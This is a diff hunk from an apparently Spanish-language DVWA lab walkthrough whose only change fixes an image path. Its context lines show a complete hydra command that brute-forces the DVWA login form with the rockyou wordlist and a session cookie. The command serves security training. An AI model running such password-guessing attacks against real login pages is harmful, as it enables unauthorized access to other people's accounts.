@@ -19,7 +19,7 @@
 hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP_SERVIDOR> http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=<TU_SESION>;security=low:F=Username and/or password incorrect."
 ```
 
-<img src="./../assets/BruteForceLow02.png">
+<img src="../../assets/BruteForceLow02.png">
 
 Nota: Reemplazar <IP_SERVIDOR> y <TU_SESION>.
 
